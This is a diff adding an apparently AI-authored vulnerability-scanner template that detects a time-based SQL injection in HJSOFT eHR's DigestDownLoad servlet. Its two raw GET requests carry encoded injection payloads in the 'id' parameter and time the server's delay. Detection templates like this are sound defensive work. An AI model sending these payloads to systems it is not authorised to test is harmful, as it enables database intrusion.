@@ -1,0 +1,49 @@
+id: hjsoft-ehr-digestdownload-sqli
+info:
+  name: HJSOFT eHR DigestDownload SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the DigestDownload servlet of HJSOFT eHR. The issue can be exploited via crafted `id` parameters, leading to potential database interaction delays.
+  metadata:
+    fingerprint: 宏景eHR
+
+http:
+  - raw:
+      - |
+        GET /servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcVlfbP56PAATTP2HJFPAATTPPAATTP2HJFPAATTPkfU7lSDv5nFnpafrEPAATTP3HJDPAATTP HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "WAITFOR DELAY"
+      - type: dsl
+        dsl:
+          - duration >= 5
+          - duration <= 7
+
+  - raw:
+      - |
+        GET /servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcVlfbHOxpIStWPAATTP2HJFPAATTPTiXTUlNUQRdO4PAATTP3HJDPAATTP HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "WAITFOR DELAY"
+      - type: dsl
+        dsl:
+          - duration >= 7
+          - duration <= 9
